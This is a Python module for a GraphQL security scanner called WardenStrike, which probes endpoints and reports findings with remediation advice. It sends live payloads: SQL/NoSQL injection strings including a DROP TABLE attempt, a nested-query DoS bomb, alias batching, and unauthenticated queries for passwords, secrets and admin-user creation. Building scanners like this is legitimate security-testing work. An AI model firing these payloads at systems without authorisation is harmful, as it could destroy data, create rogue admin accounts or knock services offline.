"""
WardenStrike - GraphQL Security Scanner
Tests for: introspection, batching attacks, IDOR, auth bypass,
injection, DoS via deep queries, field suggestions, mutations.
"""

import asyncio
import json
import re
import urllib.request
import urllib.parse
import urllib.error
from dataclasses import dataclass, field
from typing import Any

from wardenstrike.config import Config
from wardenstrike.utils.logger import get_logger

log = get_logger("graphql")


@dataclass
class GraphQLFinding:
    issue: str
    severity: str
    endpoint: str
    details: dict = field(default_factory=dict)
    payload: str = ""
    remediation: str = ""


class GraphQLScanner:
    """
    Comprehensive GraphQL security scanner.
    Detects: introspection enabled, batching DoS, IDOR in mutations,
    auth bypass, injection, field suggestion info leak, verbose errors.
    """

    INTROSPECTION_QUERY = """
    {
      __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types {
          name
          kind
          fields {
            name
            args { name type { name kind } }
            type { name kind }
          }
        }
      }
    }
    """

    BATCH_INTROSPECTION = [{"query": INTROSPECTION_QUERY}] * 10

    FIELD_SUGGESTION_QUERIES = [
        '{ usr { id } }',
        '{ users { pasword } }',
        '{ me { emal } }',
        '{ admin { tok } }',
    ]

    INJECTION_PAYLOADS = [
        '{ user(id: "1 OR 1=1") { id name } }',
        '{ user(id: "1\' OR \'1\'=\'1") { id name } }',
        '{ user(id: "1; DROP TABLE users--") { id name } }',
        '{ user(id: "$ne: null") { id name } }',
        '{ search(query: "a%00b") { results } }',
    ]

    DEPTH_BOMB = """{
      user {
        friends {
          friends {
            friends {
              friends {
                friends {
                  friends {
                    id name email
                  }
                }
              }
            }
          }
        }
      }
    }"""

    ALIAS_BATCH_ATTACK = "\n".join([
        f"q{i}: user(id: {i}) {{ id name email }}" for i in range(1, 101)
    ])

    def __init__(self, config: Config, ai=None):
        self.config = config
        self.ai = ai
        self.findings: list[GraphQLFinding] = []
        self.headers = {
            "Content-Type": "application/json",
            "User-Agent": "WardenStrike/1.0",
        }
        self.schema = None

    def _add(self, issue, severity, endpoint, details=None, payload="", remediation=""):
        f = GraphQLFinding(issue, severity, endpoint, details or {}, payload, remediation)
        self.findings.append(f)
        log.info(f"[GraphQL/{severity.upper()}] {issue} @ {endpoint}")

    def _post(self, url: str, body: Any, extra_headers: dict = None,
              timeout: int = 10) -> tuple[dict | None, int]:
        try:
            data = json.dumps(body).encode()
            headers = {**self.headers, **(extra_headers or {})}
            req = urllib.request.Request(url, data=data, headers=headers, method="POST")
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                return json.loads(resp.read()), resp.status
        except urllib.error.HTTPError as e:
            try:
                return json.loads(e.read()), e.code
            except Exception:
                return None, e.code
        except Exception:
            return None, -1

    # ─── Discovery ────────────────────────────────────────────────

    @staticmethod
    def discover_endpoints(base_url: str) -> list[str]:
        """Common GraphQL endpoint paths to probe."""
        paths = [
            "/graphql", "/graphql/", "/api/graphql", "/api/v1/graphql",
            "/api/v2/graphql", "/graphql/v1", "/graphql/v2", "/gql",
            "/query", "/api/query", "/v1/graphql", "/v2/graphql",
            "/graphiql", "/playground", "/altair", "/explorer",
            "/__graphql", "/graphql-playground",
        ]
        base = base_url.rstrip("/")
        return [f"{base}{p}" for p in paths]

    # ─── Introspection ────────────────────────────────────────────

    def check_introspection(self, url: str) -> dict | None:
        """Check if introspection is enabled and extract full schema."""
        log.info(f"Testing introspection: {url}")

        resp, status = self._post(url, {"query": self.INTROSPECTION_QUERY})

        if resp and "data" in resp and resp["data"] and resp["data"].get("__schema"):
            self._add("GraphQL introspection enabled",
                      "medium", url,
                      details={"types_count": len(resp["data"]["__schema"].get("types", []))},
                      payload=self.INTROSPECTION_QUERY.strip(),
                      remediation="Disable introspection in production environments")
            self.schema = resp["data"]["__schema"]

            # Analyze schema for sensitive types/fields
            self._analyze_schema(url, self.schema)
            return self.schema

        return None

    def _analyze_schema(self, url: str, schema: dict):
        """Analyze GraphQL schema for sensitive fields and mutations."""
        sensitive_field_patterns = [
            "password", "passwd", "secret", "token", "api_key", "apikey",
            "private_key", "credit_card", "ssn", "bank", "admin", "role",
            "permission", "auth", "hash", "salt", "internal", "debug",
        ]

        for t in schema.get("types", []):
            tname = t.get("name", "")
            if tname.startswith("__"):
                continue

            for field_def in (t.get("fields") or []):
                fname = (field_def.get("name") or "").lower()
                for pattern in sensitive_field_patterns:
                    if pattern in fname:
                        self._add(f"Sensitive field in schema: {tname}.{field_def['name']}",
                                  "medium", url,
                                  details={"type": tname, "field": field_def["name"]},
                                  remediation="Review if sensitive fields should be exposed via API")

        # Check for dangerous mutations
        mutation_type = schema.get("mutationType")
        if mutation_type:
            dangerous_mutations = ["delete", "remove", "destroy", "drop", "admin",
                                   "reset", "override", "escalate", "grant"]
            for t in schema.get("types", []):
                if t.get("name") == mutation_type.get("name"):
                    for field_def in (t.get("fields") or []):
                        fname = (field_def.get("name") or "").lower()
                        for dm in dangerous_mutations:
                            if dm in fname:
                                self._add(f"Potentially dangerous mutation: {field_def['name']}",
                                          "high", url,
                                          details={"mutation": field_def["name"]},
                                          payload=f"mutation {{ {field_def['name']}(...) {{ ... }} }}",
                                          remediation="Implement strict authorization on all mutations")

    # ─── Batch/Alias attacks ──────────────────────────────────────

    def check_batching(self, url: str) -> bool:
        """Test for query batching (enables brute-force bypass)."""
        log.info(f"Testing batch queries: {url}")

        # Array-based batching
        batch_payload = [
            {"query": "{ __typename }"},
            {"query": "{ __typename }"},
            {"query": "{ __typename }"},
        ]
        resp, status = self._post(url, batch_payload)
        if resp and isinstance(resp, list) and len(resp) == 3:
            self._add("GraphQL batching enabled — brute-force/rate-limit bypass possible",
                      "high", url,
                      details={"batch_size": 3, "response": str(resp)[:200]},
                      payload=json.dumps(batch_payload[:1]),
                      remediation="Disable query batching or implement per-query rate limiting")
            return True

        # Alias-based batching
        alias_query = f"{{ {self.ALIAS_BATCH_ATTACK} }}"
        resp, _ = self._post(url, {"query": alias_query})
        if resp and "data" in resp:
            self._add("GraphQL alias batching enabled — 100+ queries in 1 request",
                      "high", url,
                      details={"aliases_tested": 100},
                      payload=f"{{ q1: user(id:1){{id}} q2: user(id:2){{id}} ... q100: user(id:100){{id}} }}",
                      remediation="Implement query depth/complexity limits and alias limits")
            return True

        return False

    # ─── Depth bomb / DoS ─────────────────────────────────────────

    def check_depth_dos(self, url: str):
        """Test for deeply nested query DoS."""
        resp, _ = self._post(url, {"query": self.DEPTH_BOMB}, timeout=15)
        if resp and "data" in resp:
            self._add("GraphQL has no query depth limit — DoS via deeply nested queries",
                      "medium", url,
                      payload=self.DEPTH_BOMB.strip(),
                      remediation="Implement query depth limiting (max 5-7 levels)")

    # ─── Field suggestions ────────────────────────────────────────

    def check_field_suggestions(self, url: str) -> bool:
        """Detect if field suggestions leak schema information even when introspection is off."""
        for query in self.FIELD_SUGGESTION_QUERIES:
            resp, _ = self._post(url, {"query": query})
            if resp:
                errors = resp.get("errors", [])
                for error in errors:
                    msg = error.get("message", "")
                    if "did you mean" in msg.lower() or "suggestion" in msg.lower():
                        self._add("GraphQL field suggestions enabled — schema info leak without introspection",
                                  "low", url,
                                  details={"suggestion_error": msg},
                                  payload=query,
                                  remediation="Disable field suggestions in production")
                        return True
        return False

    # ─── Auth bypass ──────────────────────────────────────────────

    def check_auth_bypass(self, url: str) -> list[dict]:
        """Test common GraphQL authentication bypass techniques."""
        results = []

        # Unauthenticated access to sensitive operations
        sensitive_queries = [
            ('{ users { id email password } }', "Unauth user list with password field"),
            ('{ me { id email roles permissions } }', "Unauth current user info"),
            ('{ admin { id email } }', "Unauth admin query"),
            ('{ config { secret_key database_url } }', "Unauth config exposure"),
            ('mutation { createUser(role: "admin") { id } }', "Unauth admin user creation"),
        ]

        for query, desc in sensitive_queries:
            resp, status = self._post(url, {"query": query})
            if resp and "data" in resp and resp["data"]:
                # Got data without authentication
                data = resp["data"]
                if any(v is not None for v in (data.values() if isinstance(data, dict) else [])):
                    self._add(f"Potentially unauthenticated access: {desc}",
                              "critical", url,
                              details={"query": query, "response_preview": str(resp)[:300]},
                              payload=query,
                              remediation="Implement authentication middleware for all GraphQL resolvers")
                    results.append({"query": query, "desc": desc})

        return results

    # ─── Injection ────────────────────────────────────────────────

    def check_injection(self, url: str) -> list[dict]:
        """Test GraphQL arguments for injection vulnerabilities."""
        results = []
        for payload in self.INJECTION_PAYLOADS:
            resp, status = self._post(url, {"query": payload})
            if resp:
                resp_str = json.dumps(resp)
                # Look for SQL/NoSQL error signatures
                error_patterns = [
                    "syntax error", "ORA-", "mysql_fetch", "pg_query",
                    "MongoError", "SQL", "sqlite", "postgresql",
                    "near \"OR\"", "Unclosed quotation"
                ]
                for pattern in error_patterns:
                    if pattern.lower() in resp_str.lower():
                        self._add("Possible injection in GraphQL argument",
                                  "high", url,
                                  details={"payload": payload, "error": resp_str[:300]},
                                  payload=payload,
                                  remediation="Sanitize and validate all GraphQL input arguments")
                        results.append({"payload": payload, "pattern": pattern})
                        break

        return results

    # ─── CSRF via GET ─────────────────────────────────────────────

    def check_get_mutations(self, url: str) -> bool:
        """Check if mutations are accepted via GET (CSRF risk)."""
        try:
            query = 'mutation { __typename }'
            encoded = urllib.parse.quote(query)
            req = urllib.request.Request(
                f"{url}?query={encoded}",
                headers={"User-Agent": "WardenStrike/1.0"}
            )
            with urllib.request.urlopen(req, timeout=10) as resp:
                data = json.loads(resp.read())
                if "data" in data and not data.get("errors"):
                    self._add("GraphQL mutations accepted via GET — CSRF possible",
                              "high", url,
                              payload=f"GET {url}?query=mutation{{...}}",
                              remediation="Block GET requests for mutations, require POST with CSRF token")
                    return True
        except Exception:
            pass
        return False

    # ─── Full scan ────────────────────────────────────────────────

    async def scan(self, target_url: str, headers: dict = None,
                   discover: bool = True) -> dict:
        """Run complete GraphQL security assessment."""
        log.info(f"Starting GraphQL scan: {target_url}")
        self.findings.clear()

        if headers:
            self.headers.update(headers)

        endpoints_to_test = []
        if discover:
            endpoints_to_test = self.discover_endpoints(target_url)
            # Quick probe to find active endpoints
            active = []
            for ep in endpoints_to_test:
                resp, status = self._post(ep, {"query": "{ __typename }"})
                if resp is not None and status not in (-1, 404, 403, 301, 302):
                    active.append(ep)
            endpoints_to_test = active or [target_url]
        else:
            endpoints_to_test = [target_url]

        all_results = []
        for endpoint in endpoints_to_test:
            log.info(f"Testing endpoint: {endpoint}")
            schema = self.check_introspection(endpoint)
            self.check_batching(endpoint)
            self.check_depth_dos(endpoint)
            self.check_field_suggestions(endpoint)
            self.check_auth_bypass(endpoint)
            self.check_injection(endpoint)
            self.check_get_mutations(endpoint)

            all_results.append({
                "endpoint": endpoint,
                "schema_discovered": schema is not None,
            })

        # AI analysis if available
        ai_analysis = {}
        if self.ai and self.schema:
            try:
                ai_analysis = self.ai._call(
                    "You are a GraphQL security expert. Analyze this schema and identify exploitable vulnerabilities.",
                    f"Schema summary:\n{json.dumps(self.schema, indent=2)[:5000]}\n\nFindings:\n{json.dumps([vars(f) for f in self.findings], indent=2)[:3000]}",
                    json_mode=False
                )
            except Exception:
                pass

        return {
            "endpoints": all_results,
            "findings": [vars(f) for f in self.findings],
            "schema_available": self.schema is not None,
            "ai_analysis": ai_analysis,
            "summary": {
                "endpoints_tested": len(all_results),
                "total_findings": len(self.findings),
                "critical": sum(1 for f in self.findings if f.severity == "critical"),
                "high": sum(1 for f in self.findings if f.severity == "high"),
            }
        }
